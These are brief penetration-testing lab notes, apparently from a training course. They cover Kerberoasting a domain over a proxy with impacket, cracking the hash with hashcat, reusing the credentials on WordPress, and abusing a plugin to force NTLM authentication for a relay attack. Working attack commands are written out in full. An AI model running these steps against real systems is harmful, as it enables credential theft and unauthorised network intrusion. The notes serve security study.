## Speak Kerberoast and Enter

Perform Kerberoast over SOCKS5 proxy using Proxychains:
`proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john`

Store and crack obtained hash:
`sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force`

Can try to reuse creds for WordPress login

## Abuse a WordPress Plugin for a Relay Attack

Information:
- Users
- Settings > General
- Plugins
	- Identify places where you can force an NTLM authentication which can then be relayed

Guess which user WordPress is running as from the active sessions obtained from BloodHound

